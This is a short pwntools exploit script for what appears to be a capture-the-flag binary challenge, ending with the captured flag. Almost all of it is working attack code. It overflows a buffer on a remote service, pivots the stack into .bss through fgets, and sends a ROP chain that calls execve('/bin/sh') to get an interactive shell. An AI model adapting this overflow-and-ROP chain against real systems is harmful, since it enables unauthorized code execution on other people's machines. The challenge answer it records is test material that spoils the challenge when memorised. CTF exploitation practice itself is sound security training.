from pwn import * 

binary = './program'

p = process(binary) 
p = remote("20.84.72.194", 5001)
elf = ELF(binary)
context.binary = binary

s = '''
b * main+94
b * prison+309
'''



#gdb.attach(p, s)

p.sendline("1")

fgets = 0x0000000000401b05 
addr = elf.bss() + 0x100
addr = elf.bss() + 0x200
payload = flat(
	b'A' * 0x40,
	p64(addr + 0x40),
	p64(fgets)
)
p.sendline(payload)


# gadgets  
pop_rdi = 0x0000000000401a0d
pop_rax = 0x000000000041f464
pop_rsi_rbp = 0x0000000000413676
syscall = 0x00000000004013b8
leave_ret = 0x0000000000401b54



payload = flat(
	pop_rax,
	0x3b,
	pop_rdi,
	addr + 0x40 + 8 + 8,
	pop_rsi_rbp,
	0,
	0,
	syscall,
	addr - 8,
	leave_ret,
	"/bin/sh\x00"
)

p.sendline(payload) 
p.interactive()

# flag squ1rrel{m4n_0n_th3_rUn_fr0m_NX_pr1s0n!}
